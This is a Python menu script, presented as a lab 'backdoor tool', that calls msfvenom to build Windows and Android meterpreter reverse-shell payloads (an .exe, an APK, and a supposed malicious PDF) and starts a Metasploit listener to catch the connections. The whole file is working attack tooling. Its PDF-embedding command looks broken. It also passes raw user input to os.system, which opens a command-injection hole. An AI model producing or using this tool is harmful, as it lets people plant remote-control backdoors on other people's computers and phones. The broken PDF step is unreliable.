#v1-test-build
import os
import time

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("=" * 60)
    print("  🛡️  CYBERSECURITY BACKDOOR TOOL (For Lab Use Only)")
    print("=" * 60)

def generate_windows_payload():
    clear()
    banner()
    print("[1] Create Windows Reverse Shell Payload")

    lhost = input("Enter your IP (LHOST): ")
    lport = input("Enter the port to listen on (LPORT): ")
    output_file = input("Enter output filename (e.g., backdoor.exe): ")

    print("\n[*] Generating payload using msfvenom...\n")
    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
    os.system(cmd)

    print(f"\n[+] Payload saved as: {output_file}")
    input("\nPress Enter to return to the menu...")

def start_listener():
    clear()
    banner()
    print("[2] Start Metasploit Listener")

    lhost = input("Enter your IP (LHOST): ")
    lport = input("Enter the port to listen on (LPORT): ")
    payload = input("Enter payload type (e.g., windows/meterpreter/reverse_tcp): ")

    print("\n[*] Starting Metasploit handler...\n")
    msf_cmd = (
        f"msfconsole -q -x \"use exploit/multi/handler; "
        f"set PAYLOAD {payload}; set LHOST {lhost}; "
        f"set LPORT {lport}; exploit\""
    )
    os.system(msf_cmd)

def generate_android_pdf_payload():
    clear()
    banner()
    print("[3] Create Android Reverse Shell Embedded in PDF")

    lhost = input("Enter your IP (LHOST): ")
    lport = input("Enter the port to listen on (LPORT): ")
    output_file = input("Enter output filename (e.g., exploit.pdf): ")

    print("\n[*] Generating PDF payload...\n")
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw | msfvenom -p - -f pdf -o {output_file}"
    os.system(cmd)

    print(f"\n[+] Malicious PDF generated: {output_file}")
    input("\nPress Enter to return to the menu...")

def generate_android_apk_payload():
    clear()
    banner()
    print("[4] Create Android Reverse Shell APK")

    lhost = input("Enter your IP (LHOST): ")
    lport = input("Enter the port to listen on (LPORT): ")
    output_file = input("Enter output filename (e.g., payload.apk): ")

    print("\n[*] Generating APK payload...\n")
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {output_file}"
    os.system(cmd)

    print(f"\n[+] Android payload APK saved as: {output_file}")
    input("\nPress Enter to return to the menu...")

def main():
    while True:
        clear()
        banner()
        print("[1] Create Windows Payload")
        print("[2] Start Listener (Metasploit)")
        print("[3] Create Android Payload via PDF")
        print("[4] Create Android Payload via APK")
        print("[5] Exit")
        choice = input("\nSelect an option: ")

        if choice == '1':
            generate_windows_payload()
        elif choice == '2':
            start_listener()
        elif choice == '3':
            generate_android_pdf_payload()
        elif choice == '4':
            generate_android_apk_payload()
        elif choice == '5':
            print("Exiting... Stay ethical! 🛡️")
            time.sleep(1)
            break
        else:
            print("Invalid option. Try again.")
            time.sleep(1)

if __name__ == "__main__":
    main()
